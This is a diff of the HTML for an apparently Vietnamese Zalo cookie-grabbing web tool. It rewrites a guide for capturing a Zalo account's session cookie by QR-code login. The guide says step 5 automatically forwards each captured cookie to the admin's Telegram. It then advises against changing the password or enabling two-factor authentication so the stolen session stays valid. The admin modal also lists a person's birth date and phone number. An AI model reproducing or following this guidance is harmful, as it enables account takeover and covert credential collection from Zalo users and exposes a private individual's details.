@@ -296,30 +296,108 @@ body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacS
 ════════════════════════════════════════════════════════ -->
 <div class="modal-overlay" id="admin-modal" onclick="if(event.target===this)closeModal('admin-modal')">
   <div class="modal-box">
-    <div class="modal-title">🔐 Thông tin Admin</div>
-    <div class="admin-avatar">👑</div>
-    <div class="admin-name" id="admin-display-name">Khánh Nam (Dzi)</div>
-    <div class="admin-title">IT Automation Developer · 2026</div>
-    <div class="admin-info-row">📱 TikTok: <b>@hkhanhnam206</b></div>
-    <div class="admin-info-row">💬 Zalo: <b>0987654321</b></div>
-    <div class="admin-info-row">📧 Email: <b>knammelbel206@gmail.com</b></div>
-    <button class="close-btn" onclick="closeModal('admin-modal')">Đóng</button>
+    <div class="admin-avatar">🧑‍💻</div>
+    <div class="admin-name">Nguyễn Hoàng Khánh Nam</div>
+    <div class="admin-title">Dzi Meo Meo · IT Automation Developer · 2026</div>
+    <div class="admin-info-row">🎂 <span>30/05/2006</span></div>
+    <div class="admin-info-row">📱 <span>Zalo: <b>0993329535</b></span></div>
+    <div class="admin-info-row">🎵 <span>TikTok: <b>@hkhanhnam206</b></span></div>
+    <div class="admin-info-row">💼 <span>Lĩnh vực: <b>IT / Automation / Bot Dev</b></span></div>
+    <div class="admin-info-row">✨ <span>Admin: <b>Dzi Meo Meo</b></span></div>
+    <button class="close-btn" onclick="closeModal('admin-modal')">✕ Đóng</button>
   </div>
 </div>
 
 <!-- GUIDE MODAL -->
 <div class="modal-overlay" id="guide-modal" onclick="if(event.target===this)closeModal('guide-modal')">
-  <div class="modal-box">
-    <div class="modal-title">📚 Hướng dẫn lấy cookie Zalo</div>
-    <div class="guide-section-title">🚀 Các bước thực hiện</div>
-    <div class="guide-step"><div class="step-num">1</div><div class="step-content"><h4>Nhấn "Bắt đầu"</h4><p>Hệ thống sẽ tạo mã QR đăng nhập Zalo. Chờ khoảng 5-10 giây.</p></div></div>
-    <div class="guide-step"><div class="step-num">2</div><div class="step-content"><h4>Quét mã QR bằng Zalo</h4><p>Mở app Zalo → Nhấn icon QR ở góc trên → Quét mã.</p><div class="tip">⚡ Mã QR có hiệu lực 2 phút. Nếu hết hạn, nhấn làm mới.</div></div></div>
-    <div class="guide-step"><div class="step-num">3</div><div class="step-content"><h4>Xác nhận đăng nhập</h4><p>Trên điện thoại sẽ hiện thông báo xác nhận. Nhấn <b>"Xác nhận"</b>.</p></div></div>
-    <div class="guide-step"><div class="step-num">4</div><div class="step-content"><h4>Lấy cookie</h4><p>Cookie sẽ hiển thị tự động. Copy hoặc tải về file .txt.</p></div></div>
+  <div class="modal-box" style="max-width:580px">
+    <div class="modal-title">📖 Hướng dẫn lấy & bảo quản cookie</div>
+
+    <div class="guide-section-title">🚀 Cách lấy cookie Zalo</div>
+
+    <div class="guide-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <h4>Chuẩn bị 2 thiết bị</h4>
+        <p>Cần <b>2 điện thoại</b> (hoặc 1 điện thoại + 1 máy tính).<br>
+        • <b>Thiết bị A</b>: điện thoại đang đăng nhập tài khoản Zalo muốn lấy cookie.<br>
+        • <b>Thiết bị B</b>: điện thoại/máy tính dùng để mở web này và quét QR.</p>
+        <div class="tip">💡 Có thể dùng cùng 1 điện thoại nhưng cần 2 tài khoản Zalo khác nhau hoặc chế độ phân chia màn hình.</div>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <h4>Mở web này trên Thiết bị B</h4>
+        <p>Truy cập trang web này trên Thiết bị B (thiết bị không cần đăng nhập Zalo).</p>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <h4>Bấm "Bắt đầu" và chờ QR hiện</h4>
+        <p>Bấm nút <b>🚀 Bắt đầu</b>, chờ mã QR xuất hiện trên màn hình (khoảng 5–10 giây).</p>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <h4>Dùng Thiết bị A quét QR</h4>
+        <p>Trên <b>Thiết bị A</b> (điện thoại có Zalo muốn lấy cookie):<br>
+        1. Mở app <b>Zalo</b><br>
+        2. Bấm biểu tượng <b>QR</b> hoặc vào <b>Cài đặt → Quét mã QR</b><br>
+        3. Hướng camera vào mã QR trên Thiết bị B<br>
+        4. Bấm <b>Xác nhận đăng nhập</b> trên Thiết bị A</p>
+        <div class="tip">💡 Mã QR có hiệu lực khoảng 2 phút. Nếu hết hạn bấm "Làm mới" để tạo QR mới.</div>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <h4>Cookie được lấy tự động</h4>
+        <p>Sau khi xác nhận, web tự động lấy cookie và hiển thị thông tin tài khoản. Cookie cũng được gửi tự động về Telegram admin để lưu trữ.</p>
+      </div>
+    </div>
+
     <div class="guide-divider"></div>
-    <div class="guide-section-title">⚠️ Lưu ý quan trọng</div>
-    <div class="guide-step"><div class="step-num">!</div><div class="step-content"><h4>Bảo mật tài khoản</h4><p>Cookie Zalo như mật khẩu. Không chia sẻ với người khác!</p><div class="tip" style="border-color:var(--red);color:var(--red);background:rgba(255,82,82,.08)">🔴 Cookie có thể bị thu hồi nếu đăng nhập nhiều nơi cùng lúc.</div></div></div>
-    <button class="close-btn" onclick="closeModal('guide-modal')">Đã hiểu</button>
+    <div class="guide-section-title">🛡️ Cách bảo quản cookie không bị die</div>
+
+    <div class="guide-step">
+      <div class="step-num">⚠️</div>
+      <div class="step-content">
+        <h4>Những việc LÀM cookie die ngay</h4>
+        <div class="warn-tip">❌ Đăng xuất Zalo trên điện thoại gốc<br>❌ Đổi mật khẩu Zalo<br>❌ Bật xác thực 2 lớp sau khi lấy cookie<br>❌ Zalo phát hiện đăng nhập bất thường và buộc đăng xuất</div>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">✅</div>
+      <div class="step-content">
+        <h4>Cách giữ cookie sống lâu</h4>
+        <p>• Không đăng xuất Zalo trên điện thoại gốc<br>
+        • Lưu cookie ở nơi an toàn, không chia sẻ công khai<br>
+        • Dùng cookie trong vòng 24h sau khi lấy<br>
+        • Tránh đổi mật khẩu hoặc email liên kết<br>
+        • Không dùng cookie từ 2 IP quá khác nhau cùng lúc</p>
+        <div class="tip">💡 Cookie Zalo thường sống từ <b>7–30 ngày</b> nếu không có hành động đăng xuất. Để lâu hơn thì thỉnh thoảng dùng cookie đó gọi API 1 lần để refresh session.</div>
+      </div>
+    </div>
+
+    <div class="guide-step">
+      <div class="step-num">💾</div>
+      <div class="step-content">
+        <h4>Lưu trữ cookie đúng cách</h4>
+        <p>• Tải file <b>.txt</b> về lưu vào thư mục an toàn<br>
+        • Có thể import vào trình duyệt bằng extension <b>EditThisCookie</b><br>
+        • Dùng cho các tool Zalo API thì paste vào trường "cookie"</p>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="closeModal('guide-modal')">✕ Đóng</button>
   </div>
 </div>
 
